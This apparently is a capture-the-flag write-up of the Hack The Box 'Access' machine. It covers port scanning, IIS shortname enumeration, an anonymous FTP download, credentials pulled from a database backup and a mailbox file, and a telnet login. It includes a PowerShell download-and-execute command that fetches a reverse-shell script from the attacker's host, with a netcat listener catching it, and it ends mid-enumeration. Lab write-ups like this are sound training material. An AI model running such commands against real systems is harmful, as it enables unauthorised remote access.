# Access

```
kali@kali:~/htb/Access$ sudo nmap -sV -sC 10.129.77.17
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 11:14 EST
Nmap scan report for 10.129.77.17
Host is up (0.030s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.49 seconds
kali@kali:~/htb/Access$ 
```

We got quite a few vectors to attack here. The webpage is only an image. We can see it's IIS, so before fuzzing we can try the tilde / shortname enumeration I recently learned about.

I clone it from here: https://github.com/irsdl/IIS-ShortName-Scanner 

```
kali@kali:~/htb/Access$ java -jar /home/kali/IIS-ShortName-Scanner/iis_shortname_scanner.jar http://10.129.77.17/ /home/kali/IIS-ShortName-Scanner/config.xml 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by IISShortNameScanner.IIS_ShortName_Scanner (file:/home/kali/IIS-ShortName-Scanner/iis_shortname_scanner.jar) to field java.net.HttpURLConnection.method
WARNING: Please consider reporting this to the maintainers of IISShortNameScanner.IIS_ShortName_Scanner
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/02/02 11:27:19
Target: http://10.129.77.17/
|_ Result: Vulnerable!
|_ Used HTTP method: DEBUG
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 9
kali@kali:~/htb/Access$ 
```

It's vulnerable, so let's try finding something:

```
kali@kali:~/htb/Access$ java -jar /home/kali/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://10.129.77.17 /home/kali/IIS-ShortName-Scanner/config.xml 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
magicFileName: *~1*
requestMethodDelimiter: ,
requestMethod: DEBUG,OPTIONS,GET,POST,HEAD,TRACE
nameStartsWith: 
extStartsWith: 
hassleFree: true
cookies: IIS_Tilde_Scanner=1;
outputFile: iis_shortname_scanner_logfile.txt
proxyServerName: 
acceptableDifferenceLengthBetweenResponses: 10
proxyServerPort: 
magicFinalPartList: \a.aspx,\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx
headersDelimiter: @@
saveOutput: false
maxNumericalPart: 3
headers: X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1
useProvidedURLWithoutChange: false
debug: false
maxConnectionTimeOut: 20000
magicFinalPartDelimiter: ,
forceNumericalPart: 1
userAgent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10
inScopeCharacters: ETAONRISHDLFCMUGYPWBVKJXQZ0123456789_-$~()&!#%'@^`{}
asteriskSymbol: *
showActualNames: true
maxRetryTimes: 10
maxDelayAfterEachRequest: 1
magicFileExtension: *
URLSuffix: ?&aspxerrorpath=/
questionMarkSymbol: ?

-- Current Configuration -- Begin
Scan Mode: ALL
Number of threads: 20
Config file: /home/kali/IIS-ShortName-Scanner/config.xml
Scanner version: 2.3.9 (05 February 2017)
-- Current Configuration -- End
Max delay after each request in milliseconds = 1
No proxy has been used.

Scanning...

Testing request method: "DEBUG" with magic part: "\a.aspx" ...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by IISShortNameScanner.IIS_ShortName_Scanner (file:/home/kali/IIS-ShortName-Scanner/iis_shortname_scanner.jar) to field java.net.HttpURLConnection.method
WARNING: Please consider reporting this to the maintainers of IISShortNameScanner.IIS_ShortName_Scanner
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
Dir: ASPNET~1H
File: INDEX~1.HTM
[|] INDEX~1.HTT
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/02/02 11:30:23
Target: http://10.129.77.17/
|_ Result: Vulnerable!
|_ Used HTTP method: DEBUG
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 282
  |_ Identified directories: 1
    |_ ASPNET~1
  |_ Indentified files: 1
    |_ INDEX~1.HTM
      |_ Actual file name = INDEX

Finished in: 2 second(s)
```

We got a directory that begins with ASPNET, and a file named INDEX. The index file is just the same as the default homepage, and I can't find anything beginning with ASPNET in my wordlists.

I'm just going to throw on a fuzzer and move on.

We know we have anonymous access to the ftp server:

```
kali@kali:~/htb/Access$ ftp 10.129.77.17
Connected to 10.129.77.17.
220 Microsoft FTP Service
Name (10.129.77.17:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> 
```

So I'm just gonna download that directory for ease of use:

```
kali@kali:~/htb/Access$ wget -r --no-passive --no-parent ftp://anonymous:anonymous@10.129.77.17
--2021-02-02 11:41:51--  ftp://anonymous:*password*@10.129.77.17/
           => ‘10.129.77.17/.listing’
Connecting to 10.129.77.17:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.

10.129.77.17/.listing                                  [ <=>                                                                                                           ]      97  --.-KB/s    in 0s      

==> PORT ... done.    ==> LIST ... done.

10.129.77.17/.listing                                  [ <=>                                                                                                           ]      97  --.-KB/s    in 0s      

2021-02-02 11:41:51 (69.9 MB/s) - ‘10.129.77.17/.listing’ saved [194]

Removed ‘10.129.77.17/.listing’.
--2021-02-02 11:41:51--  ftp://anonymous:*password*@10.129.77.17/Backups/
           => ‘10.129.77.17/Backups/.listing’
==> CWD (1) /Backups ... done.
==> PORT ... done.    ==> LIST ... done.

10.129.77.17/Backups/.listing                          [ <=>                                                                                                           ]      51  --.-KB/s    in 0s      

2021-02-02 11:41:51 (441 KB/s) - ‘10.129.77.17/Backups/.listing’ saved [51]

Removed ‘10.129.77.17/Backups/.listing’.
--2021-02-02 11:41:51--  ftp://anonymous:*password*@10.129.77.17/Backups/backup.mdb
           => ‘10.129.77.17/Backups/backup.mdb’
==> CWD not required.
==> PORT ... done.    ==> RETR backup.mdb ... done.
Length: 5652480 (5.4M)

10.129.77.17/Backups/backup.mdb                    100%[==============================================================================================================>]   5.39M  1.56MB/s    in 3.5s    

2021-02-02 11:41:55 (1.56 MB/s) - ‘10.129.77.17/Backups/backup.mdb’ saved [5652480]

--2021-02-02 11:41:55--  ftp://anonymous:*password*@10.129.77.17/Engineer/
           => ‘10.129.77.17/Engineer/.listing’
==> CWD (1) /Engineer ... done.
==> PORT ... done.    ==> LIST ... done.

10.129.77.17/Engineer/.listing                         [ <=>                                                                                                           ]      59  --.-KB/s    in 0s      

2021-02-02 11:41:55 (15.8 MB/s) - ‘10.129.77.17/Engineer/.listing’ saved [59]

Removed ‘10.129.77.17/Engineer/.listing’.
--2021-02-02 11:41:55--  ftp://anonymous:*password*@10.129.77.17/Engineer/Access%20Control.zip
           => ‘10.129.77.17/Engineer/Access Control.zip’
==> CWD not required.
==> PORT ... done.    ==> RETR Access Control.zip ... done.
Length: 10870 (11K)

10.129.77.17/Engineer/Access Control.zip           100%[==============================================================================================================>]  10.62K  --.-KB/s    in 0.06s   

2021-02-02 11:41:55 (178 KB/s) - ‘10.129.77.17/Engineer/Access Control.zip’ saved [10870]

FINISHED --2021-02-02 11:41:55--
Total wall clock time: 4.2s
Downloaded: 2 files, 5.4M in 3.5s (1.53 MB/s)
kali@kali:~/htb/Access$ 
```

And we can see the structure and files:


```
kali@kali:~/htb/Access$ tree
.
└── 10.129.77.17
    ├── Backups
    │   └── backup.mdb
    └── Engineer
        └── Access Control.zip
kali@kali:~/htb/Access$ file 10.129.77.17/Backups/backup.mdb 
10.129.77.17/Backups/backup.mdb: Microsoft Access Database
```

I run strings on it:

```
kali@kali:~/htb/Access$ strings -n 7 10.129.77.17/Backups/backup.mdb 
Standard Jet DB
[...]
[...]
[...]
acc_antiback.nine_mode5
acc_antiback.eight_mode6
acc_antiback.seven_mode6
acc_antiback.six_mode4
acc_antiback.five_mode5
acc_antiback.four_mode5
acc_antiback.three_mode6
acc_antiback.two_mode4
acc_antiback.one_mode4
acc_antiback.device_id5
acc_antiback.status2
acc_antiback.delete_time7
acc_antiback.delete_operator;
acc_antiback.create_time7
acc_antiback.create_operator;
acc_antiback.change_time7
acc_antiback.change_operator;
acc_antiback.id.
Wiegand66Q
Wiegand50Q
Wiegand37aR
Wiegand37Q
Wiegand36Q
Wiegand34aR
Wiegand34Q
Wiegand26aR
Wiegand26Q
AutoMatchWiegandFmt[
AccLevelsetEmp
Delete personnel permissions informationX
UserInfo
Personnel Changes510>
Departments
Add DepartmentExecutiveD
UserInfo
Add Personnel510:
AuthUser
Add Personnelbackup_adminC
AuthUser
Add Personnelengineer?
AuthUser
Delete Personnel26<
AuthUser
Modify Personneladmin?
UserInfo
Add Personnel505:
UserInfo
Add Personnel502:
UserInfo
Add Personnel511:
AuthUser
Add Personnelengineer1@
AccLevelsetEmp
Delete personnel permissions informationX
UserInfo
Personnel Changes538>
AccLevelsetEmp
Delete personnel permissions informationX
UserInfo
Personnel Changes538>
Departments
Add DepartmentSales@
Departments
Add DepartmentFinanceB
Departments
Add DepartmentIT=
UserInfo
Add Personnel538:
AuthUser
Modify Personneladmin?
AuthUser
Modify Personneladmin?
AuthUser
Add Personneladmin<
AccTimeseg
Time Zone Edit24-Hour AccessibleL
AccTimeseg
Add Time Zone24-Hour AccessibleK
[...]
[...]
[...]
administrator;
Administrator<
4555555555555Q
restart
ppermission
backup_admin
engineer
access4u@security
Md`fJbv
QuQMomYqQ
SYbJbMQ
AttItem(MayOverTime)
*g~{0R[
AttItem(MinOverTime)l
AttItem(MinAbsent)j
AttItem(minEarly)i
AttItem(minLater)i
ID="{B30AFA92-66F4-4060-9CBA-EAEF20756DC0}"
Name="att2000"
HelpContextID="0"
VersionCompatible32="393222000"
CMG="B0B24FB553B553B553B553"
DPB="60629F60A060A060"
GC="1012EF10F010F0EF"
[Host Extender Info]
&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
att2000
0046}#2.
0#0#C:\W
INNT\Sys@tem32\
.tlb#OLE
 Automat
CAA006D2(EA4
ogram Fi
les\Comm,on
9\m@sado21
icrosoft
 ActiveX
 Data Ob
jects 2.
1 Librar
att2000
Area Name
        m       Z       G       G
333333333333333333333333333333333333333333333333333333333
ho+G04I
J)fYiZI
)f#I_SK
)f#I_SK
Buzul   E
        w       d       Q       >       +
24-Hour Accessible
24-Hour Accessible:
AttItem(minLater)m
AttItem(minEarly)o
AttItem(MinAbsent)r
Rahman 
Carter 
[...]
[...]
[...]
kali@kali:~/htb/Access$ 
```

And we see some interesting strings here. Such as the add user commands. And the names at the bottom. We can also use mdbtools to dig into this file in a nicer way:


```
kali@kali:~/htb/Access$ mdb-tables 10.129.77.17/Backups/backup.mdb | tr ' ' '\n'
acc_antiback
acc_door
acc_firstopen
acc_firstopen_emp
acc_holidays
acc_interlock
acc_levelset
acc_levelset_door_group
acc_linkageio
acc_map
acc_mapdoorpos
acc_morecardempgroup
acc_morecardgroup
acc_timeseg
acc_wiegandfmt
ACGroup
acholiday
ACTimeZones
action_log
AlarmLog
areaadmin
att_attreport
att_waitforprocessdata
attcalclog
attexception
AuditedExc
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
base_additiondata
base_appoption
base_basecode
base_datatranslation
base_operatortemplate
base_personaloption
base_strresource
base_strtranslation
base_systemoption
CHECKEXACT
CHECKINOUT
dbbackuplog
DEPARTMENTS
deptadmin
DeptUsedSchs
devcmds
devcmds_bak
django_content_type
django_session
EmOpLog
empitemdefine
EXCNOTES
FaceTemp
iclock_dstime
iclock_oplog
iclock_testdata
iclock_testdata_admin_area
iclock_testdata_admin_dept
LeaveClass
LeaveClass1
Machines
NUM_RUN
NUM_RUN_DEIL
operatecmds
personnel_area
personnel_cardtype
personnel_empchange
personnel_leavelog
ReportItem
SchClass
SECURITYDETAILS
ServerLog
SHIFT
TBKEY
TBSMSALLOT
TBSMSINFO
TEMPLATE
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
worktable_groupmsg
worktable_instantmsg
worktable_msgtype
worktable_usrmsg
ZKAttendanceMonthStatistics
acc_levelset_emp
acc_morecardset
ACUnlockComb
AttParam
auth_group
AUTHDEVICE
base_option
dbapp_viewmodel
FingerVein
devlog
HOLIDAYS
personnel_issuecard
SystemLog
USER_TEMP_SCH
UserUsedSClasses
acc_monitor_log
OfflinePermitGroups
OfflinePermitUsers
OfflinePermitDoors
LossCard
TmpPermitGroups
TmpPermitUsers
TmpPermitDoors
ParamSet
acc_reader
acc_auxiliary
STD_WiegandFmt
CustomReport
ReportField
BioTemplate
FaceTempEx
FingerVeinEx
TEMPLATEEx
```

The first time I ran it, the tables were only seperated by a space, so I replaced the space with a newline for better readability.

```
kali@kali:~/htb/Access$ mdb-export 10.129.77.17/Backups/backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
kali@kali:~/htb/Access$ 
```

And we have some credentials.

Since the zip file is under Engineer, I assumed it was the engineer users password I had to use, and it worked.

```
kali@kali:~/htb/Access$ 7z x 10.129.77.17/Engineer/Access\ Control.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: 10.129.77.17/Engineer/Access Control.zip
--
Path = 10.129.77.17/Engineer/Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
kali@kali:~/htb/Access$ file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

I google the format and see that you should use readpst to read them.

Unfortunately, apt-get readpst does not work so:

```
kali@kali:~/htb/Access$ apt search readpst
Sorting... Done
Full Text Search... Done
pst-utils/kali-rolling 0.6.75-1 amd64
  tools for reading Microsoft Outlook PST files
kali@kali:~/htb/Access$ sudo apt-get install pst-utils
```

Now we got that installed, and we can:

```
kali@kali:~/htb/Access$ readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
kali@kali:~/htb/Access$ ls
 10.129.77.17  'Access Control.mbox'  'Access Control.pst'   iis   info.txt
kali@kali:~/htb/Access$ cat Access\ Control.mbox 
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-461207361_-_-"


----boundary-LibPST-iamunique-461207361_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-461207361_-_-"

--alt---boundary-LibPST-iamunique-461207361_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-461207361_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-461207361_-_---

----boundary-LibPST-iamunique-461207361_-_---

kali@kali:~/htb/Access$
```

So we got a account and password: security:4Cc3ssC0ntr0ller And if we remember, there was telnet acces from the nmap.

```
kali@kali:~/htb/Access$ telnet 10.129.77.17
Trying 10.129.77.17...
Connected to 10.129.77.17.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security

C:\Users\security>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

08/23/2018  10:52 PM    <DIR>          .
08/23/2018  10:52 PM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
08/24/2018  07:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  16,744,226,816 bytes free

```

The telnet interface is unruly, as we cannot even delete characters if we mistype. So I'm gonna get shell.

I'm gonna host a webserver, listen on netcat, and then run the powershell reverse script.

```
kali@kali:~/htb/Access$ sudo python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
10.129.77.17 - - [02/Feb/2021 13:38:25] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

That's the server, heres the powershell command:

```
C:\Users\security>powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.70:8000/Invoke-PowerShellTcp.ps1')

```

And finally, our listener:

```
kali@kali:~/htb/Access$ sudo rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.77.17 49161
Windows PowerShell running as user security on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\security>whoami
access\security
PS C:\Users\security> 
```

So Let's see our opportunities for privesc:

```
PS C:\Users\security> netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:23             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.77.17:23        10.10.14.70:48304      ESTABLISHED     InHost      
  TCP    10.129.77.17:49161     10.10.14.70:1337       ESTABLISHED     InHost      
  TCP    [::]:21                [::]:0                 LISTENING       InHost      
  TCP    [::]:23                [::]:0                 LISTENING       InHost      
  TCP    [::]:80                [::]:0                 LISTENING       InHost      
  TCP    [::]:135               [::]:0                 LISTENING       InHost      
  TCP    [::]:445               [::]:0                 LISTENING       InHost      
  TCP    [::]:47001             [::]:0                 LISTENING       InHost      
  TCP    [::]:49152             [::]:0                 LISTENING       InHost      
  TCP    [::]:49153             [::]:0                 LISTENING       InHost      
  TCP    [::]:49154             [::]:0                 LISTENING       InHost      
  TCP    [::]:49155             [::]:0                 LISTENING       InHost      
  TCP    [::]:49156             [::]:0                 LISTENING       InHost      
  UDP    0.0.0.0:123            *:*                                                
  UDP    0.0.0.0:500            *:*                                                
  UDP    0.0.0.0:4500           *:*                                                
  UDP    0.0.0.0:5355           *:*                                                
  UDP    [::]:123               *:*                                                
  UDP    [::]:500               *:*                                                
  UDP    [::]:4500              *:*                                                
  UDP    [::]:5355              *:*                                                
PS C:\Users\security> systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          2/2/2021, 1:22:04 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,464 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,510 MB
Virtual Memory: In Use:    585 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
                           [01]: KB981391
                           [02]: KB981392
                           [03]: KB977236
                           [04]: KB981111
                           [05]: KB977238
                           [06]: KB977239
                           [07]: KB981390
                           [08]: KB2032276
                           [09]: KB2296011
                           [10]: KB2305420
                           [11]: KB2345886
                           [12]: KB2347290
                           [13]: KB2378111
                           [14]: KB2386667
                           [15]: KB2387149
                           [16]: KB2393802
                           [17]: KB2419640
                           [18]: KB2423089
                           [19]: KB2425227
                           [20]: KB2442962
                           [21]: KB2454826
                           [22]: KB2467023
                           [23]: KB2479943
                           [24]: KB2483614
                           [25]: KB2484033
                           [26]: KB2488113
                           [27]: KB2505438
                           [28]: KB2506014
                           [29]: KB2506212
                           [30]: KB2506928
                           [31]: KB2509553
                           [32]: KB2511250
                           [33]: KB2511455
                           [34]: KB2522422
                           [35]: KB2529073
                           [36]: KB2535512
                           [37]: KB2544893
                           [38]: KB2545698
                           [39]: KB2547666
                           [40]: KB2552343
                           [41]: KB2560656
                           [42]: KB2563227
                           [43]: KB2564958
                           [44]: KB2570947
                           [45]: KB2585542
                           [46]: KB2598845
                           [47]: KB2603229
                           [48]: KB2604114
                           [49]: KB2607047
                           [50]: KB2608658
                           [51]: KB2618451
                           [52]: KB2620704
                           [53]: KB2621440
                           [54]: KB2631813
                           [55]: KB2640148
                           [56]: KB2643719
                           [57]: KB2653956
                           [58]: KB2654428
                           [59]: KB2656355
                           [60]: KB2660075
                           [61]: KB2667402
                           [62]: KB2676562
                           [63]: KB2685811
                           [64]: KB2685813
                           [65]: KB2685939
                           [66]: KB2690533
                           [67]: KB2698365
                           [68]: KB2705219
                           [69]: KB2709630
                           [70]: KB2712808
                           [71]: KB2716513
                           [72]: KB2718704
                           [73]: KB2719033
                           [74]: KB2726535
                           [75]: KB2727528
                           [76]: KB2729094
                           [77]: KB2729451
                           [78]: KB2741355
                           [79]: KB2742598
                           [80]: KB2748349
                           [81]: KB2758857
                           [82]: KB2761217
                           [83]: KB2765809
                           [84]: KB2770660
                           [85]: KB2789644
                           [86]: KB2791765
                           [87]: KB2807986
                           [88]: KB2813347
                           [89]: KB2840149
                           [90]: KB2998812
                           [91]: KB958488
                           [92]: KB972270
                           [93]: KB974431
                           [94]: KB974571
                           [95]: KB975467
                           [96]: KB975560
                           [97]: KB977074
                           [98]: KB978542
                           [99]: KB978601
                           [100]: KB979099
                           [101]: KB979309
                           [102]: KB979482
                           [103]: KB979538
                           [104]: KB979687
                           [105]: KB979688
                           [106]: KB980408
                           [107]: KB980846
                           [108]: KB982018
                           [109]: KB982132
                           [110]: KB982799
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.77.17
                                 [02]: fe80::11f1:c9f6:6095:fb9
                                 [03]: dead:beef::11f1:c9f6:6095:fb9
PS C:\Users\security> whoami /all

USER INFORMATION
----------------

User Name       SID                                       
=============== ==========================================
access\security S-1-5-21-953262931-566350628-63446256-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                        Attributes                                        
====================================== ================ ========================================== ==================================================
Everyone                               Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
ACCESS\TelnetClients                   Alias            S-1-5-21-953262931-566350628-63446256-1000 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                    Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\security> 
```

We got a Windows Server 2008 R2, port 445 is open. So we could port-forward it with plink.exe. And we have SeChangeNotifyPrivilege. We could maybe run Sherlock to see if we can find any vulnerabilities.

But first I'm gonna look around the computer a bit, maybe we have something laying around.

In Public\Desktop I find an interesting file:

```
PS C:\Users\Public> cd Desktop
PS C:\Users\Public\Desktop> ls


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk                                                    


PS C:\Users\Public\Desktop> type "ZKAccess3.5 Security System.lnk"
